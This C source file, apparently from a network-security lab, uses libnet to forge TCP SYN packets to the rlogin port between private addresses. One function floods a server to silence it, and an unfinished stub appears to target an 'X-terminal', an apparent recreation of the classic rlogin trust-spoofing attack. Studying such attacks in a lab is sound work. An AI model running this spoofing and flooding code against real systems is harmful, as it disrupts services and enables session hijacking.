
#include "globals.h"
#include "typedef.h"
#include "utils_libnet.h"

void toggleServer(char *toggle) {
  Libnet libnet = makeLibnet();
  IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.3");

  uint32_t payloadLength = strlen(toggle);

  uint16_t sourcePort = 530;
  uint16_t destinationPort = 513;
  uint32_t sequenceNumber = 128000;
  uint32_t acknowledgementNumber = 0;

  PayloadOptions payloadOptions =
      makePayloadOptions(toggle, payloadLength, libnet, 0);
  TCPOptions tcpOptions =
      makeTCPOptions(sourcePort, destinationPort, sequenceNumber,
                     acknowledgementNumber, TH_SYN, payloadLength, libnet, 0);
  IPv4Options ipv4Options = makeIPv4TCPOptions(
      addresses.source, addresses.destination, payloadLength, libnet, 0);

  addPayloadToContext(payloadOptions);
  addTCPToContext(tcpOptions);
  addIPv4ToContext(ipv4Options);

  if (strcmp(toggle, "disable") == 0) {
    for (int i = 0; i < 10; i++) {
      libnet_write(libnet.context);
    }
  } else if (strcmp(toggle, "enable") == 0) {
    libnet_write(libnet.context);
  }
  freeLibnet(libnet);
}

void proveXterminal() {
  Libnet libnet = makeLibnet();
  IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.4");

  uint16_t sourcePort = 530;
  uint16_t destinationPort = 513;
  uint32_t sequenceNumber = 128000;
  uint32_t acknowledgementNumber = 0;
}

int main(void) {
  toggleServer("enable");
  return 0;
}
